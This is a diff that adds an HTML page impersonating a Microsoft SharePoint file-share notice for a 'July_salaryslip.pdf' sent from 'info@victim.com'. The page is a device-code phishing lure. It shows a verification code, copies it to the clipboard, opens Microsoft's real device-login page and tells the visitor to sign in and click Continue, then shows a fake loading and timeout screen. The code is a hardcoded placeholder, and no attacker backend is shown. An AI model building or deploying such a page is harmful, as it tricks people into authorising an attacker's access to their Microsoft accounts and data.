@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint Encrypted PDF</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --sp-teal: #038387;
+            --sp-teal-dark: #025d60;
+            --sp-blue: #0078d4;
+            --sp-blue-dark: #106ebe;
+            --bg-page: #f3f2f1;
+            --bg-card: #ffffff;
+            --bg-code: #1b1b1f;
+            --text-primary: #323130;
+            --text-secondary: #605e5c;
+            --text-tertiary: #a19f9d;
+            --border: #edebe9;
+            --border-dark: #d2d0ce;
+            --success: #107c10;
+            --error: #a4262c;
+            --font: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+        }
+        body { font-family: var(--font); background: var(--bg-page); min-height: 100vh; display: flex; flex-direction: column; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes codeReveal { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
+        @keyframes dotPulse { 0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); } 40% { opacity: 1; transform: scale(1); } }
+
+        .sp-header { background: var(--sp-teal); padding: 0 24px; height: 48px; display: flex; align-items: center; gap: 12px; }
+        .sp-header svg { width: 24px; height: 24px; fill: #fff; flex-shrink: 0; }
+        .sp-header-title { color: #fff; font-size: 16px; font-weight: 600; }
+        .sp-header-dot { width: 4px; height: 4px; background: rgba(255,255,255,0.5); border-radius: 50%; }
+
+        .sp-command-bar { background: #fff; border-bottom: 1px solid var(--border); padding: 0 24px; height: 44px; display: flex; align-items: center; gap: 16px; }
+        .sp-cmd-btn { display: flex; align-items: center; gap: 6px; font-size: 13px; color: var(--text-secondary); background: none; border: none; cursor: default; font-family: inherit; }
+        .sp-cmd-btn i { font-size: 14px; color: var(--sp-blue); }
+        .sp-cmd-sep { width: 1px; height: 20px; background: var(--border); }
+
+        .sp-main { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 40px 24px; }
+        .sp-container { width: 100%; max-width: 520px; animation: fadeUp 0.5s ease-out; }
+
+        .sp-share-banner { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .sp-share-avatar { width: 36px; height: 36px; background: var(--sp-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 14px; font-weight: 600; flex-shrink: 0; }
+        .sp-share-text { font-size: 14px; color: var(--text-secondary); line-height: 1.4; }
+        .sp-share-text strong { color: var(--text-primary); }
+
+        .sp-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.04), 0 4px 16px rgba(0,0,0,0.06); overflow: hidden; }
+        .sp-doc-preview { background: linear-gradient(135deg, #f0fafa 0%, #e8f4f4 100%); border-bottom: 1px solid var(--border); padding: 32px 28px; display: flex; align-items: center; gap: 16px; }
+        .sp-doc-icon { width: 56px; height: 56px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .sp-doc-icon-word { background: #185abd; border-radius: 6px; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; }
+        .sp-doc-icon-word span { color: #fff; font-size: 20px; font-weight: 700; }
+        .sp-doc-meta h2 { font-size: 16px; font-weight: 600; color: var(--text-primary); margin-bottom: 4px; }
+        .sp-doc-meta p { font-size: 13px; color: var(--text-secondary); margin: 0; }
+        .sp-doc-meta .sp-doc-size { margin-top: 2px; font-size: 12px; color: var(--text-tertiary); }
+
+        .sp-card-body { padding: 24px 28px; }
+        .sp-desc { font-size: 14px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 20px; }
+
+        .sp-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; background: var(--sp-teal); color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.15s; font-family: inherit; }
+        .sp-btn:hover { background: var(--sp-teal-dark); }
+        .sp-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .sp-btn i { font-size: 15px; }
+
+        .code-box { background: var(--bg-code); border-radius: 8px; padding: 20px; margin-bottom: 14px; position: relative; overflow: hidden; }
+        .code-box::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--sp-teal), var(--sp-blue)); }
+        .code-box-label { font-size: 10px; font-weight: 700; letter-spacing: 1px; color: rgba(255,255,255,0.5); text-transform: uppercase; margin-bottom: 12px; text-align: center; }
+        .code-value { font-size: 32px; font-weight: 700; letter-spacing: 6px; color: var(--sp-teal); text-align: center; font-family: 'SF Mono', 'Cascadia Code', Consolas, Monaco, monospace; animation: codeReveal 0.4s ease-out; }
+
+        .btn-copy { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background: transparent; border: 1.5px solid var(--sp-teal); color: var(--sp-teal); padding: 10px 16px; border-radius: 4px; font-size: 13px; font-weight: 600; margin-bottom: 20px; cursor: pointer; transition: all 0.15s; font-family: inherit; }
+        .btn-copy:hover { background: var(--sp-teal); color: #fff; }
+        .btn-copy.copied { background: var(--success); border-color: var(--success); color: #fff; }
+
+        .steps { font-size: 13px; color: var(--text-secondary); margin: 0 0 16px; padding: 0; list-style: none; counter-reset: step; }
+        .steps li { counter-increment: step; display: flex; align-items: flex-start; gap: 10px; margin-bottom: 8px; line-height: 1.5; }
+        .steps li::before { content: counter(step); flex-shrink: 0; width: 22px; height: 22px; background: #e8f4f4; color: var(--sp-teal); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; }
+        .steps-link { font-size: 13px; color: var(--text-secondary); margin-top: 4px; }
+        .steps-link a { color: var(--sp-blue); text-decoration: none; font-weight: 600; }
+
+        .poll-status { font-size: 13px; color: var(--text-secondary); margin-top: 16px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .spinner-dot { width: 6px; height: 6px; background: var(--sp-teal); border-radius: 50%; animation: dotPulse 1.4s infinite ease-in-out; }
+        .spinner-dot:nth-child(2) { animation-delay: 0.2s; }
+        .spinner-dot:nth-child(3) { animation-delay: 0.4s; }
+
+        .init-error { font-size: 13px; color: var(--error); margin-top: 12px; text-align: center; padding: 10px 14px; background: rgba(164,38,44,0.06); border-radius: 4px; display: none; }
+
+        .done-box { text-align: center; padding: 32px 20px; animation: fadeUp 0.4s ease-out; }
+        .done-loading-ring { width: 48px; height: 48px; border: 3px solid var(--border); border-top-color: var(--sp-teal); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .done-box p { font-size: 15px; color: var(--text-primary); font-weight: 600; }
+        .done-box .done-sub { font-size: 13px; color: var(--text-secondary); font-weight: 400; transition: opacity 0.3s; }
+        .done-progress { margin-top: 16px; height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; }
+        .done-progress-bar { height: 100%; background: var(--sp-teal); border-radius: 2px; transition: width 0.1s linear; width: 0%; }
+
+        .sp-urgency { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: #d83b01; background: #fed9cc; padding: 8px 14px; border-radius: 4px; margin-bottom: 12px; }
+        .sp-urgency i { font-size: 14px; }
+        .sp-sender-detail { font-size: 12px; color: var(--text-tertiary); margin: -8px 0 16px 48px; display: flex; align-items: center; gap: 6px; }
+        .sp-sender-detail i { font-size: 11px; }
+        .sp-doc-icon-type { border-radius: 6px; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; }
+        .sp-doc-icon-type span { color: #fff; font-size: 20px; font-weight: 700; }
+        .sp-footer { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 20px; font-size: 12px; color: var(--text-tertiary); }
+        .sp-footer i { color: var(--success); font-size: 11px; }
+
+        @media (max-width: 480px) {
+            .sp-main { padding: 20px 12px; }
+            .sp-container { max-width: 100%; }
+            .sp-doc-preview { padding: 20px; }
+            .sp-card-body { padding: 20px; }
+            .code-value { font-size: 26px; letter-spacing: 4px; }
+            .sp-command-bar { display: none; }
+        }
+        @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; } }
+    </style>
+</head>
+<body>
+    <div class="sp-header">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="rgba(255,255,255,0.2)"/><path d="M12.5 6.5c1.5 0 3 .6 4 1.7.2.2.1.5-.1.7l-1.2.9c-.2.1-.4.1-.6 0-.6-.6-1.3-.9-2.1-.9-1.7 0-3 1.4-3 3s1.3 3 3 3c.8 0 1.5-.3 2.1-.9.2-.2.4-.2.6 0l1.2.9c.2.2.3.5.1.7-1 1.1-2.5 1.7-4 1.7-2.8 0-5-2.2-5-5s2.2-4.8 5-4.8z" fill="#fff"/></svg>
+        <span class="sp-header-title">SharePoint</span>
+    </div>
+    <div class="sp-command-bar">
+        <span class="sp-cmd-btn"><i class="far fa-file-lines"></i> Documents</span>
+        <span class="sp-cmd-sep"></span>
+        <span class="sp-cmd-btn"><i class="fas fa-share-nodes"></i> Shared</span>
+        <span class="sp-cmd-sep"></span>
+        <span class="sp-cmd-btn"><i class="fas fa-clock-rotate-left"></i> Recent</span>
+    </div>
+
+    <div class="sp-main">
+        <div class="sp-container">
+            
+            <div class="sp-share-banner">
+                <div class="sp-share-avatar">H</div>
+                <div class="sp-share-text">
+                    <strong>HELLO USERNAME</strong> shared a PDF document with you
+                </div>
+            </div>
+            
+            <div class="sp-sender-detail">
+                <i class="far fa-envelope"></i> info@victim.com
+                &middot; USERNAME
+            </div>
+            
+
+            <div class="sp-card">
+                <div class="sp-doc-preview">
+                    <div class="sp-doc-icon">
+                        <div class="sp-doc-icon-type" style="background:#d83b01;"><span>PDF</span></div>
+                    </div>
+                    <div class="sp-doc-meta">
+                        <h2>July_salaryslip.pdf</h2>
+                        <p>Shared with you</p>
+                        <p class="sp-doc-size">
+                            Adobe PDF &middot; Shared via SharePoint
+                            &middot; 1.5 MB
+                        </p>
+                        <p class="sp-doc-size"><i class="far fa-calendar" style="font-size:11px;"></i> April 29, 2026</p>
+                    </div>
+                </div>
+
+                <div class="sp-card-body">
+                    <p class="sp-desc">Verify Identity</p>
+
+                    <div id="phase1">
+                        <button type="button" class="sp-btn" id="btnContinue">
+                            <i class="fab fa-microsoft"></i>
+                            View PDF
+                        </button>
+                        <div id="initError" class="init-error"></div>
+                    </div>
+
+                    <div id="phase2" style="display:none;">
+                        <div class="code-box">
+                            <div class="code-box-label">Your verification code</div>
+                            <div class="code-value" id="codeDisplay">ABCD1234</div>
+                        </div>
+                        <button type="button" class="btn-copy" id="btnCopy">
+                            <i class="far fa-copy"></i> Copy code
+                        </button>
+                        <a id="openSigninBtn" href="https://microsoft.com/devicelogin" target="_blank" rel="noopener" class="sp-btn" style="text-decoration:none; margin-top: 10px;">
+                            <i class="fab fa-microsoft"></i>
+                            Open Microsoft Sign-in
+                        </a>
+                        <ol class="steps">
+                            <li>Click the button above to open Microsoft sign-in</li>
+                            <li>Paste the code above (already copied to your clipboard)</li>
+                            <li>Sign in with your Microsoft account and click <strong>Continue</strong></li>
+                        </ol>
+                        <p class="steps-link">
+                            Window didn't open? <a href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">Click here</a> and paste the code.
+                        </p>
+                        <div id="pollStatus" class="poll-status">
+                            <span class="spinner-dot"></span>
+                            <span class="spinner-dot"></span>
+                            <span class="spinner-dot"></span>
+                            <span>Waiting for sign-in&hellip;</span>
+                        </div>
+                    </div>
+
+                    <div id="stepDone" class="done-box" style="display:none;">
+                        <div id="spLoadingState">
+                            <div class="done-loading-ring"></div>
+                            <p>Loading document…</p>
+                            <p class="done-sub" id="spDoneMsg">Connecting to SharePoint…</p>
+                            <div class="done-progress"><div class="done-progress-bar" id="spRedirectBar"></div></div>
+                        </div>
+                        <div id="spRecalledState" style="display:none;text-align:center;animation:fadeUp 0.5s ease-out">
+                            <div style="font-size:48px;margin-bottom:16px;color:#5f6368"><i class="fas fa-hourglass-end"></i></div>
+                            <p style="font-size:16px;font-weight:600;color:#3c4043;margin-bottom:4px">File is taking longer than expected</p>
+                            <p style="color:#5f6368;margin-top:8px;font-size:14px;line-height:1.6">We're still trying to load this file from SharePoint. The connection may have timed out. Please try again.</p>
+                            <button onclick="location.reload()" style="margin-top:20px;padding:10px 28px;background:#0078d4;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer">Try Again</button>
+                            <p style="color:#80868b;margin-top:14px;font-size:12px">If the issue persists, check your connection or contact the sender.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sp-footer">
+                <i class="fas fa-lock"></i>
+                <span>Protected by Microsoft SharePoint</span>
+            </div>
+        </div>
+    </div>
+    <script>
+        (function() {
+            var btnCopy = document.getElementById('btnCopy');
+            var phase1 = document.getElementById('phase1');
+            var phase2 = document.getElementById('phase2');
+            var codeDisplay = document.getElementById('codeDisplay');
+            var openSigninBtn = document.getElementById('openSigninBtn');
+
+            function animatePhase(hideEl, showEl) {
+                hideEl.style.display = 'none';
+                showEl.style.display = 'block';
+                showEl.style.animation = 'none';
+                showEl.offsetHeight;
+                showEl.style.animation = 'fadeUp 0.4s ease-out';
+            }
+
+            function showCopied() {
+                btnCopy.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                btnCopy.classList.add('copied');
+                setTimeout(function() { 
+                    btnCopy.innerHTML = '<i class="far fa-copy"></i> Copy code'; 
+                    btnCopy.classList.remove('copied'); 
+                }, 2200);
+            }
+
+            function autoInit() {
+                // Instantly load step 2 with your hardcoded code layout
+                codeDisplay.textContent = "ABCD1234";
+                animatePhase(phase1, phase2);
+            }
+
+            autoInit();
+
+            function _doCopy(code) {
+                if (!code) return;
+                var ta = document.createElement('textarea');
+                ta.value = code; ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
+                document.body.appendChild(ta); ta.focus(); ta.select();
+                try { document.execCommand('copy'); showCopied(); } catch(e) {}
+                document.body.removeChild(ta);
+            }
+
+            btnCopy.addEventListener('click', function() { _doCopy(codeDisplay.textContent); });
+
+            if (openSigninBtn) {
+                openSigninBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    _doCopy(codeDisplay.textContent);
+                    var verifyUrl = openSigninBtn.href || 'https://microsoft.com/devicelogin';
+                    var pw = 500, ph = 650;
+                    var sl = Math.max(0, screen.width - pw - 20);
+                    var st = 0;
+                    var pop = window.open(verifyUrl, 'MicrosoftSignIn', 'width=' + pw + ',height=' + ph + ',left=' + sl + ',top=' + st + ',toolbar=no,menubar=no,location=no');
+                    if (!pop || pop.closed || typeof pop.closed === 'undefined') {
+                        window.open(verifyUrl, '_blank', 'noopener');
+                    } else {
+                        try { pop.focus(); } catch (err) {}
+                    }
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
